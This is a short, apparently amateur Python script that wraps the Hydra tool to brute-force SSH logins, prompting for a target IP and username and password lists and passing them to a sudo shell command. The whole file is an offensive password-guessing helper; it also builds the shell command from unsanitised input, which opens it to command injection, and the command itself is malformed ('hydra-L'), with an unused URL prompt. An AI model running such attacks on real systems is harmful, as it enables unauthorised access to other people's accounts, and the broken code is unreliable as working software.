# importing modules
import sys
import os
import re
import time

def hydra_brute_force():
    # etc stands for et cetra it's not a protocol incase a script kiddie is reading this just to clarify!
    target_ip = input("Enter The target ip")
    type_of_attack = input("Enter The type_of_attack [ssh/ftp/etc]")
    user_list = input("Enter The location of username's list (if any other then just enter the username you know)")
    passlist = input("Enter The location of password list")

    url = input("Enter target url")
    if type_of_attack == "ssh":
        os.system(f"sudo  hydra-L {user_list} -P {passlist} ssh {target_ip}")    




if __name__ == "__main__":
    hydra_brute_force()
